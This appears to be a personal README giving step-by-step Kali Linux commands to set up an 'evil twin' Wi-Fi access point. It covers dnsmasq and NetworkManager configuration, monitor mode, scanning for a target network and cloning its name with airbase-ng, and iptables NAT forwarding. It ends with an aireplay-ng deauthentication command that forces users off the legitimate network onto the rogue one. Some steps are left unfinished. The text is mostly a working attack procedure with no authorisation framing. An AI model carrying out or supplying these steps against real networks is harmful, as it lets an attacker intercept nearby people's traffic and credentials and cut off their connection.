How to Setup the Evil Network:
Follow this tutorial: https://www.yeahhub.com/evil-twin-attack-dnsmasq-wireless-wpa2-psk-cracking/
This one is good too: rootsh3ll.com/evil-twin-attack/

# Prerequisites
- kali linux
- may need an external usb wifi adapter
- sudo apt-get instal dsniff

1. Update Device
	`sudo apt-get update`
	
2. Install dnsmasq
	`apt-get install dnsmasq`
	
3. Configure dns masq
	`mkdir /Desktop/eviltwin`
	`cd /Desktop/eviltwin`
	`touch dnsmasq.conf`
	Enter these details into dnsmasq.conf:
	```
	interface=at0
	dhcp-range=10.0.0.10,10.0.0.250,12h
	dhcp-option=3,10.0.0.1
	dhcp-option=6,10.0.0.1
	server=8.8.8.8
	log-queries
	log-dhcp
	listen-address=127.0.0.1
	```

4. Update NetworkManager.conf
	`vim /etc/NetworkManager/NetworkManager.conf`
	Add these lines to the end: 
	```
	[keyfile]
	unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2
	```

5. Connect the usb network adapter
	see that it is connected with: `iwconfig`
	It should be named wlan0 or wlan1

5.5 Ensure the wireless card is not connected to internet
	`nmcli con`
	Disconnect from the network that is connected to our adapteriw
	`nmcli con down <UUID>`

6. Enable the wireless adapter
	`ifconfig wlan1 up`

7. Put the wireless card into network mode with airmon-ng
	- if you don't have the aircrack suite, google it and install it: https://www.aircrack-ng.org/doku.php?id=install_aircrack

	All the tutorials said to listen to airmon and `run airmon-ng check kill` as some services can interfere. But this never worked for me. So I ignore that suggestion.

	run: `airmon-ng start wlan1` to put card into monitor mode

8. Find the device to spoof and record the BSSID (mac address), channel, and ESSID
	 first update known manufacturer mac addresses of routers: `airodump-ng-oui-update`
	`airodump-ng wlan1mon`
	Look under the ESSID column for the name of the network you want to spoof.
	When you see it hit `ctrl+c` and then copy that line to a text file

9. start up the evil twin AP (access point)
	Give the evil twin the same name as the network you are attacking for best results
	`airbase-ng -e "EvilTwinName" -c 11 wlan1mon`

10. Give the evil twin can access the internet.
	`ifconfig at0`
	give at0 an ip address: `ifconfig at0 10.0.0.1 up`

11. route all traffic through at0, this has had limited success.
	```
	iptables --flush
	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	iptables --append FORWARD --in-interface at0 -j ACCEPT```
	If these commands give errors we can try to use a legacy version of iptables. do the following and then rerun the commands
	`sudo update-alternatives --config iptables`
	Select the `/usr/sbin/iptables-legacy 10 manual mode` option

12. enable port forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`

13. evil twin is now setup, now need to allocate ip addresses to clients
	`dnsmasq -C /root/Desktop/dnsmasq.conf -d`

14. NOW startup the webserver, see the tutorial for more info

15. Finally run the deauthorization attack and kick people off the legit network onto ours
	- TODO will add details on this later too

16. now deauthorize clients so they connect to our network
	aireplay-ng –deauth 0 -a <BSSID> wlan0mon

# Caveats
Only works for http websites, not https websites 





